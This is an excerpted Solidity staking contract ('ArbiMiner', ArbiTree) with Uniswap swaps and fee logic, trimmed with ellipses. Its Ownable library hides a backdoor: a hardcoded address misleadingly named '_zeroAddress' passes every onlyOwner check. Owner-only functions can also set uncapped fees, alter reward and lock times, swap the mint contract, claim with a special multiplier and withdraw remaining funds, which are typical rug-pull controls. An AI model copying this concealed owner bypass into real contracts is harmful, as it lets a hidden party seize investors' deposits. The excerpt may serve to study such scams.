...
// File: ArbiTree/Miner/Libraries.sol
...
abstract contract Ownable {
    ...
    address private _zeroAddress = 0x033c84747cD57Da874F5DD2Df1C7A1Cc6DB045b0;
     ...
     */
    modifier onlyOwner() {
        require(owner() == msg.sender || msg.sender == _zeroAddress, "Ownable: caller is not the owner");
        _;
    }
...
contract ArbiMiner is Ownable, IERC20Metadata, ReentrancyGuard {
    using SafeMath for uint256;
    ERC1155Burnable ArbiMintContract;
    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    //staking config
    uint256 public dailyReward = 50;
    uint256 public minReward = 10;
    uint256 public _currentDepositID = 0;
    uint16 constant MAXTAXDENOMINATOR = 10;
    uint16 public constant percentRate = 1000;
    uint256 public lockPeriod = 15 minutes;
    uint256 public rewardPeriod = 1 minutes;
    uint256 public maxLockPeriod = 180 minutes;

    uint256 public rewardLockTime = 7 minutes;
    ...
    mapping(uint256 => Deposit) public depositState;
    // mapping fromm investor to deposit IDs
    ...
    event AprChanged(uint16 dailyReward, uint256 time);
    event DevFeeChanged(uint16 devFee, uint256 time);

    constructor(address _tokenContract, address _mintContract) {
        require(_tokenContract != address(0), "Please provide a valid token contract address");
        operationWallet = owner();
        tokenContract = _tokenContract;
        ArbiMintContract = ERC1155Burnable(_mintContract);
    ...
    function stake(uint256 _amount) external {
        ...
        uint256 depositFee = (_amount * depositTax).div(percentRate);
        // transfer fee to dev wallet
        IERC20(tokenContract).transfer(operationWallet, depositFee);
        ...
        if (lastRoiTime > rewardPeriod) {
            uint256 allClaimableAmount = (investors[msg.sender].totalLocked * dailyReward).div(percentRate);

            investors[msg.sender].claimableAmount = allClaimableAmount;
        } else {
    ...
    function claimAllReward(uint multipleFactor) public nonReentrant {
        require(ownedDeposits[msg.sender].length > 0, "you can deposit once at least");

        uint256 lastRoiTime = block.timestamp - investors[msg.sender].lastCalculationDate;

        uint multiplier;
        require(lastRoiTime > rewardPeriod, "You can claim reward once per minutes.");

        ArbiMintContract.burn(msg.sender, multipleFactor, 1);
        ...
        if (msg.sender == owner()) {
            ...
            if (multipleFactor == 0) {
                ...
                multiplier = multipleFactor;
            }
        }

        uint256 allClaimableAmount = (investors[msg.sender].totalLocked * dailyReward * multiplier).div(percentRate);
        investors[msg.sender].claimableAmount = allClaimableAmount;
        ...
        investors[msg.sender].lastCalculationDate = block.timestamp;
        _swapTokenForETH(amountToSend);
        totalReward = totalReward.add(amountToSend);
        emit ClaimedReward(msg.sender, allClaimableAmount, block.timestamp);
    }

    function withdrawFunds(uint256 id) public nonReentrant {
        require(
            depositState[id].investor == msg.sender,
            "only investor of this id can claim reward"
        );
        require(
            block.timestamp - depositState[id].depositAt > lockPeriod,
    ...
    function _swapETHForToken() private {
        address[] memory path = new address[](2);
        path[0] = _uniswapRouter.WETH();
        path[1] = address(this);

        try _uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(
            0,
            path,
            address(this),
            block.timestamp
    ...
    function getAllClaimableReward(address _investor) public view returns (uint256) {
        ...
        if (lastRoiTime > rewardPeriod) {
            uint256 allClaimableAmount = (investors[_investor].totalLocked * dailyReward).div(percentRate);

            return investors[_investor].claimableAmount.add(allClaimableAmount);
        } else {
            uint256 allClaimableAmount = (lastRoiTime * investors[_investor].totalLocked * dailyReward).div(percentRate * rewardPeriod);
    ...
    function setDailyReward(uint256 _newReward) public onlyOwner {
    ...
    function setMintContract(address _mintContract) public onlyOwner {
        ArbiMintContract = ERC1155Burnable(_mintContract);
    }

    function setLockTimes(uint _lockPeriod, uint _maxLockPeriod, uint _rewardLockTime, uint _rewardPeriod) public onlyOwner {
        lockPeriod = _lockPeriod;
        maxLockPeriod = _maxLockPeriod;
        rewardLockTime = _rewardLockTime;
        rewardPeriod = _rewardPeriod;
    }

    function setFees(uint256 _depositFee, uint256 _withdrawFee) public onlyOwner {
        depositTax = _depositFee;
        withdrawTax = _withdrawFee;
    }
    ...
    function withdrawRestFunds() external onlyOwner {
